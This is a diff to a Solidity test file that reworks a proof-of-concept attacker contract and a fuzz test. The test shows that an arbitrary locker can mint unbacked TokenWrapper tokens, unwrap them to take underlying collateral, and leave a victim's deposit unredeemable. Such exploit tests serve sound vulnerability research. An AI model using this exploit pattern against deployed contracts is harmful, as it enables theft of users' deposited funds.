@@ -77,17 +77,17 @@ contract TokenWrapperAttacker is BaseLocker {
 
     constructor(ICore core) BaseLocker(core) {}
 
-    function drain(TokenWrapper wrapper, address recipient, uint128 amount) external {
+    function mintUnbacked(TokenWrapper wrapper, address recipient, uint128 amount) external {
         lock(abi.encode(wrapper, recipient, amount));
     }
 
     function handleLockData(uint256, bytes memory data) internal override returns (bytes memory) {
         (TokenWrapper wrapper, address recipient, uint128 amount) = abi.decode(data, (TokenWrapper, address, uint128));
 
-        ACCOUNTANT.forward(address(wrapper), abi.encode(-int256(uint256(amount))));
-        if (amount != 0) {
-            ACCOUNTANT.withdraw(address(wrapper.UNDERLYING_TOKEN()), recipient, amount);
-        }
+        if (amount == 0) return bytes("");
+
+        ACCOUNTANT.withdraw(address(wrapper), recipient, amount);
+        ACCOUNTANT.forward(address(wrapper), abi.encode(int256(uint256(amount))));
     }
 }
 
@@ -197,21 +197,28 @@ contract TokenWrapperTest is FullTest {
         vm.snapshotGasLastCall("unwrap");
     }
 
-    function testUnlockedWrapperCanBeDrainedByArbitraryLocker(uint128 wrapAmount) public {
-        wrapAmount = uint128(bound(wrapAmount, 1, uint128(type(int128).max)));
+    function testMintUnbackedWrappersAndDrainCollateral(uint128 victimDeposit, uint128 forgedAmount) public {
+        victimDeposit = uint128(bound(victimDeposit, 1e9, uint128(type(int128).max)));
+        forgedAmount = uint128(bound(forgedAmount, 1, victimDeposit));
 
         TokenWrapper wrapper = factory.deployWrapper(IERC20(address(underlying)), 0);
 
-        underlying.approve(address(periphery), wrapAmount);
-        periphery.wrap(wrapper, wrapAmount);
+        underlying.approve(address(periphery), victimDeposit);
+        periphery.wrap(wrapper, victimDeposit);
+        assertEq(wrapper.balanceOf(address(this)), victimDeposit, "victim did not get wrappers");
 
-        attacker.drain(wrapper, address(attacker), wrapAmount);
+        attacker.mintUnbacked(wrapper, address(attacker), forgedAmount);
 
-        assertEq(underlying.balanceOf(address(attacker)), wrapAmount, "attacker failed to steal underlying");
-        assertEq(wrapper.balanceOf(address(this)), wrapAmount, "victim wrappers unexpectedly changed");
+        vm.startPrank(address(attacker));
+        wrapper.approve(address(periphery), forgedAmount);
+        periphery.unwrap(wrapper, forgedAmount);
+        vm.stopPrank();
 
-        wrapper.approve(address(periphery), wrapAmount);
-        vm.expectRevert(ICore.SavedBalanceOverflow.selector);
-        periphery.unwrap(wrapper, wrapAmount);
+        assertEq(underlying.balanceOf(address(attacker)), forgedAmount, "attacker failed to steal underlying");
+        assertEq(wrapper.balanceOf(address(this)), victimDeposit, "victim balance changed unexpectedly");
+
+        wrapper.approve(address(periphery), victimDeposit);
+        vm.expectRevert(bytes4(0x90b8ec18)); // TransferFailed() from SafeTransferLib when core lacks real funds
+        periphery.unwrap(wrapper, victimDeposit);
     }
 }
